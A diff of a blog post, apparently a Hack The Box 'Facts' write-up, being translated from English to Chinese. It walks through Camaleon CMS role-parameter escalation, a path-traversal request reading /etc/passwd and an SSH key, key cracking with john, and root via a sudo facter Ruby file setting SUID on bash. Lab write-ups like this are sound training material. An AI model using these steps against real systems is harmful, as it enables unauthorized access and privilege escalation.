@@ -1,19 +1,21 @@
 ---
-title: HTB-Facts Writeup-draft
+title: HTB-Facts Writeup-Lock
 date: 2026-02-09T17:00:00+08:00
-draft: false
+draft: true
 toc: true
 images:
 tags:
   - Hack
   - Writeup
   - HTB
+password: "YouhavenotSecuret"
+
 ---
-> For this demonstration,the Kali IP address is 10.10.17.128.
+> 本文章以 kali 地址为 10.10.17.128 做演示
 
-## Initial Reconnaissance
+## 初始侦察
 
-### Nmap Port Scan
+### Nmap 端口扫描
 
 ```bash
 ┌──(kali㉿kali)-[~/Work/Kali]
@@ -35,9 +37,9 @@ Nmap done: 1 IP address (1 host up) scanned in 44.58 seconds
 
 ```
 
-Three TCP ports are open:22,80,54321.
+开放了三个 TCP 端口 22、80、54321。
 
-### Nmap Detailed Scan
+### Nmap 详细信息扫描
 
 ```bash
 ┌──(kali㉿kali)-[~/Work/Kali]
@@ -147,10 +149,10 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 39.98 seconds
 ```
 
-Prioritize penetration testing on port 80.
-## Web Penetration
+优先对 80 端口进行渗透。
+## Web 渗透
 
-Visiting port 80 reveals a redirecte to `facts.htb`. Added this to `hosts` file.
+访问 80 端口发现重定向到 `facts.htb`，添加进 `hosts` 中。
 
 ![](Pasted%20image%2020260209174832.png)
 
@@ -163,13 +165,13 @@ Visiting port 80 reveals a redirecte to `facts.htb`. Added this to `hosts` file.
 10.129.12.96    facts.htb
 ```
 
-Upon revisiting and browsing the basic content of the website, no obvious vulnerabilities were found.
+重新访问后对网站的基本内容进行浏览，未发现明显的漏洞。
 
 ![](Pasted%20image%2020260209175053.png)
 
-### Directory Brute-forcing and Privilege Escalation
+### 目录爆破与权限提升
 
-Performing directory brute-forcing revealed the backend login URL: `admin`.
+执行目录爆破发现后台登入地址 `admin`。
 
 ```bash
 ┌──(kali㉿kali)-[~/Work/Kali]
@@ -208,23 +210,23 @@ Finished
 ===============================================================
 ```
 
-Visiting `admin` revealed that user registration is enable.
+访问 `admin` 发现可以注册用户。
 
 ![](Pasted%20image%2020260209175343.png)
 
-Registered a user and logged in.
+注册一个用户并登入。
 
 ![](Pasted%20image%2020260209175431.png)
 
-Entering the backend, a brief overview reveals this is a `Camaleon CMS` system, version is 2.9.0.
+进入后台，简单浏览发现这是一个 `Camaleon CMS` 系统，版本为 2.9.0
 
 ![](Pasted%20image%2020260209175451.png)
 
-On the `Profile` page, personal information can be modified. Notably, the `ID` and `Role` balues are fixed.
+在 `Profile` 页面可以修改个人信息，其中 `ID` 和 `Role` 的值为固定的，值得注意。
 
 ![](Pasted%20image%2020260209175555.png)
 
-Here are some findings regarding the `name` attributes for the personal information fields.
+下面是一些个人信息的 `name` 信息发现。
 
 ![](Pasted%20image%2020260209175811.png)
 
@@ -232,7 +234,7 @@ Here are some findings regarding the `name` attributes for the personal informat
 
 ![](Pasted%20image%2020260209175919.png)
 
-Used `Burp Suite` to capture the password change request for further analysis.
+使用 `Burp Suite` 进行进一步的抓包修改密码部分进行分析。
 
 ```bash
 POST /admin/users/5/updated_ajax HTTP/1.1
@@ -268,17 +270,17 @@ Connection: keep-alive
 _method=patch&authenticity_token=wmdjew05iS50IPFTpEktXiUMZ2mavTgtJF_PiGxgVWAjcv9INpE9nUFI36h07ef5wDo5Ji7BoxUuNo6uP1VHLQ&password%5Bpassword%5D=admin&password%5Bpassword_confirmation%5D=admin
 ```
 
-The password modification fields match those found. on the parameter `password[role]=admin` during a password change can lead to privilege escalation. Attempted to modify the request and re-login.
+发现修改密码字段与在前端发现的一致，经过搜索发现当修改密码时添加参数 `password[role]=admin` 会导致用户权限提升，尝试修改添加后重新登入。
 
 ![](Pasted%20image%2020260209180359.png)
 
-gained full access to the backend system; this was verified by switching to `admin` in the `User` interface.
+获得了完整的后台系统，可以在 `User` 界面切换为 `admin`。
 
 ![](Pasted%20image%2020260209180459.png)
 
-Further research revealed that `Camaleon CMS` is vulnerable to [CVE-2024-46987](https://rubysec.com/advisories/CVE-2024-46987/) , which allows for directory traversal and arbitrary file reading.
+经过搜索发现 `Camaleon CMS` 存在 [CVE-2024-46987](https://rubysec.com/advisories/CVE-2024-46987/) 漏洞会导致路径穿越，可以随意读取文件。
 
-Accessed the URL `http://facts.htb/admin/media/download_private_file?file=../../../../../../etc/passwd` to download the `passwd` file.
+访问地址 `http://facts.htb/admin/media/download_private_file?file=../../../../../../etc/passwd` 下载 `passwd` 文件。
 
 ```passwd
 root:x:0:0:root:/root:/bin/bash
@@ -318,7 +320,7 @@ william:x:1001:1001::/home/william:/bin/bash
 _laurel:x:101:988::/var/log/laurel:/bin/false
 ```
 
-The users with a `bash` environment are `trivia` and `william`. Accessed `http://facts.htb/admin/media/download_private_file?file=../../../../../../home/trivia/id_ed25519` to attempt downloading their `id_rsa` files.
+其中有 `bash` 环境的用户为 `trivia` 与 `william`，访问 `http://facts.htb/admin/media/download_private_file?file=../../../../../../home/trivia/id_ed25519` 尝试下载他们的 `id_rsa` 文件
 
 ```id_rsa
 -----BEGIN OPENSSH PRIVATE KEY-----
@@ -331,9 +333,9 @@ ElX+bGho7xDsCOubcJxarL+rGEZ5DQTxpAjGk=
 -----END OPENSSH PRIVATE KEY-----
 ```
 
-It is worth nothing that downloading `id_rsa` failed; it was necessary to download `id_ed25519` instead. `id_ed25519` is the private key file for the modern Ed25519 algorithm recommended for SSH.
+值得注意的是，下载 `id_rsa` 是失败的，需要下载 `id_ed25519`；`id_ed25519` 是现代 SSH 推荐的 Ed25519 算法私钥文件。
 
-Rename `id_ed25519` to `id_rsa` and saved it locally.
+将 `id_ed25519` 重命名为 `id_rsa` 保存到本地。
 
 ```bash
 ┌──(kali㉿kali)-[~/Work/Kali]
@@ -348,7 +350,7 @@ id_ed25519
 id_rsa
 ```
 
-Used `john` to crack the hash generated by `ssh2john`.
+使用 `john` 破解 `ssh2john` 修改后的 `hash`。
 
 ```bash
 ──(kali㉿kali)-[~/Work/Kali]
@@ -369,9 +371,9 @@ Use the "--show" option to display all of the cracked passwords reliably
 Session completed. 
 ```
 
-## Linux Privilege Escalation
+## Linux 提权
 
-Logged in as `trivia` using the `id_rsa` key.
+使用 `id_rsa` 登入 `trivia`。
 
 ```bash
 ┌──(kali㉿kali)-[~/Work/Kali]
@@ -408,7 +410,7 @@ trivia@facts:~$ whoami
 trivia
 ```
 
-Enumerating via `sudo -l` revealed that `facter` can be run with `sudo` privileges without a password.
+枚举 `sudo -l` 发现可以无密码使用 `sudo` 权限运行 `facter`。
 
 ```bash
 trivia@facts:~$ sudo -l
@@ -419,7 +421,7 @@ User trivia may run the following commands on facts:
     (ALL) NOPASSWD: /usr/bin/facter
 ```
 
-Wrote a Ruby script for privilege escalation in the `/tmp` directory.
+在 `/tmp` 目录中写一个提权的 `rb` 文件。
 
 ```bash
 trivia@facts:/tmp/Enil$ cat >Enil.rb<< 'EOF'
@@ -433,7 +435,7 @@ puts "custom_fact=Enil"
 system("chmod +s /bin/bash")
 ```
 
-Executed `facter` with `sudo` to trigger the script, then Launched a SUID shell.
+使用 `sudo` 权限另起一个 `bash`。
 
 ```bash
 trivia@facts:/tmp/Enil$ sudo /usr/bin/facter --custom-dir=/tmp/Enil x
